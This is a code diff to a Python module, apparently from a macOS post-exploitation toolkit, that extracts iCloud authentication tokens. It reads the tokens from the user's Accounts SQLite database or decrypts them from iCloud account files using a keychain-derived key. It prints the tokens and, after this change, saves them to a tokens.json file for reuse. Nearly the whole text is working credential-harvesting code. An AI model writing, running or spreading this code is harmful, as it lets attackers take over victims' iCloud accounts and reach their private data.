@@ -9,10 +9,11 @@ import datetime
 import glob
 import hashlib
 import hmac
-import os
+from os import path
 import platform
 import sqlite3
 import struct
+import json
 import subprocess
 
 from Foundation import NSData, NSPropertyListSerialization
@@ -51,14 +52,14 @@ def bin2str(token_bplist, account_bplist=None):
         dsid_plist = NSPropertyListSerialization.propertyListWithData_options_format_error_(bin_list, 0, None, None)[0]
 
         for obj in dsid_plist["$objects"]:
-            if "{}".format(obj).startswith("urn:ds:"):
+            if str(obj).startswith("urn:ds:"):
                 dsid = obj.replace("urn:ds:", "")
 
         token_dict = {"dsid": dsid}
 
         # Do some parsing to get the data out because it is not stored
         # in a format that is easy to process with stdlibs
-        token_l = [x.strip().replace(",", "") for x in "{}".format(token_plist["$objects"]).splitlines()]
+        token_l = [x.strip().replace(",", "") for x in str(token_plist["$objects"]).splitlines()]
 
         pos_start = token_l.index("mmeBTMMInfiniteToken")
         pos_end = (token_l.index("cloudKitToken") - pos_start + 1) * 2
@@ -83,12 +84,25 @@ def bin2str(token_bplist, account_bplist=None):
 
 def run(options):
     string_builder = ""
+    token_output = path.join(options["program_directory"], "tokens.json")
+
+    if path.isfile(token_output):
+        string_builder += "We already have saved tokens, skipping prompt...\n"
+
+        with open(token_output, "r") as input_file:
+            saved_tokens = dict(json.loads(input_file.read()))
+
+            for key in saved_tokens.keys():
+                string_builder += "%s: %s\n" % (key, saved_tokens[key])
+
+        print(string_builder)
+        return
 
     # Try to find information in database first.
-    root_path = os.path.expanduser("~") + "/Library/Accounts"
+    root_path = path.expanduser("~") + "/Library/Accounts"
     accounts_db = root_path + "/Accounts3.sqlite"
 
-    if os.path.isfile(root_path + "/Accounts4.sqlite"):
+    if path.isfile(root_path + "/Accounts4.sqlite"):
         accounts_db = root_path + "/Accounts4.sqlite"
 
     database = sqlite3.connect(accounts_db)
@@ -108,15 +122,19 @@ def run(options):
         dsid_bplist = data.fetchone()[5]
 
     if token_bplist.startswith("bplist00"):
-        string_builder += "Parsing tokens from cached accounts database at [{}]\n".format(accounts_db.split("/")[-1])
+        string_builder += "Parsing tokens from cached accounts database at [%s]\n" % accounts_db.split("/")[-1]
         token_dict = bin2str(token_bplist, dsid_bplist)
 
         string_builder += "DSID: %s\n" % token_dict["dsid"]
-        del token_dict["dsid"]
 
-        for t_type, t_val in token_dict.items():
-            string_builder += "%s: %s\n" % (t_type, t_val[0])
-            string_builder += "Creation time: {}\n".format(t_val[1])
+        with open(token_output, 'wb') as output_file:
+            for t_type, t_val in token_dict.items():
+                string_builder += "[+] %s: %s\n" % (t_type, t_val[0])
+                string_builder += "    Creation time: %s\n" % t_val[1]
+
+            output_file.write(json.dumps(token_dict))
+            string_builder += "Tokens saved to: %s\n" % token_output
+
     else:
         # Otherwise try by using keychain.
         string_builder += "Checking keychain...\n"
@@ -152,7 +170,7 @@ def run(options):
         # Turn into hex for OpenSSL subprocess
         hexed_key = binascii.hexlify(hashed)
         IV = 16 * "0"
-        token_file = glob.glob(os.path.expanduser("~") + "/Library/Application Support/iCloud/Accounts/*")
+        token_file = glob.glob(path.expanduser("~") + "/Library/Application Support/iCloud/Accounts/*")
 
         for x in token_file:
             try:
@@ -181,8 +199,12 @@ def run(options):
             token_plist["appleAccountInfo"]["dsPrsID"]
         )
 
-        for t_type, t_value in token_plist["tokens"].items():
-            string_builder += "[+] %s: %s\n" % (t_type, t_value)
-            string_builder += "    Creation time: %s\n" % (get_generation_time(t_value))
+        with open(token_output, 'wb') as output_file:
+            for t_type, t_value in token_plist["tokens"].items():
+                string_builder += "[+] %s: %s\n" % (t_type, t_value)
+                string_builder += "    Creation time: %s\n" % (get_generation_time(t_value))
+
+            output_file.write(json.dumps(token_plist["tokens"].items()))
+            string_builder += "Tokens saved to: %s\n" % token_output
 
     print(string_builder)
